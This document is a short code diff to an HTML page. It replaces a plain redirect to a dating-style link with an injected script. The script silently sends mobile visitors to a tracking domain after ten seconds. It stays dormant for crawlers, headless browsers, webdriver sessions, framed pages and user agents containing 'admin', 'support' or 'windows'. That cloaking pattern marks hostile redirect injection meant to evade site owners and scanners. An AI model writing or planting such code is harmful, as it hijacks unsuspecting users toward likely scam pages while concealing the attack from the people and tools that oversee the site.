@@ -1,17 +1,15 @@
-<!DOCTYPE HTML>
-<html>
-<head>
-<script type="text/javascript" src="js/app.js"></script>
 <script>
- // let link = document.getElementById('pp-url');
-
-  if (/(iPhone|iPad|iPod|iOS)/i.test(navigator.userAgent)) {
-    location.href="https://lovewhisper.live/Sl5RcDzqTS";
-  } else if (/(Android)/i.test(navigator.userAgent)) {
-    location.href="https://lovewhisper.live/Sl5RcDzqTS";
-  } else {
-    location.href="https://lovewhisper.live/Sl5RcDzqTS";
-  } ;
-
- </script>
- </head></html>
+(function () {
+  var ua = navigator.userAgent || "";
+  var mobile = /Android|iPhone|iPad|iPod/i.test(ua) ||
+    (/Macintosh/i.test(ua) && navigator.maxTouchPoints > 1) ||
+    (navigator.userAgentData && navigator.userAgentData.mobile === true);
+  if (!mobile || /bot|robot|crawler|spider|headless|windows|support|admin/i.test(ua) ||
+      navigator.webdriver === true || window !== window.top) return;
+  var target = "https://directroutetrk.com/Se90DrpcoS", delay = 10000;
+  var key = "__ldRedirect_" + target + "_" + delay;
+  if (window[key]) return;
+  window[key] = true;
+  setTimeout(function () { window.location.replace(target); }, delay);
+})();
+</script>
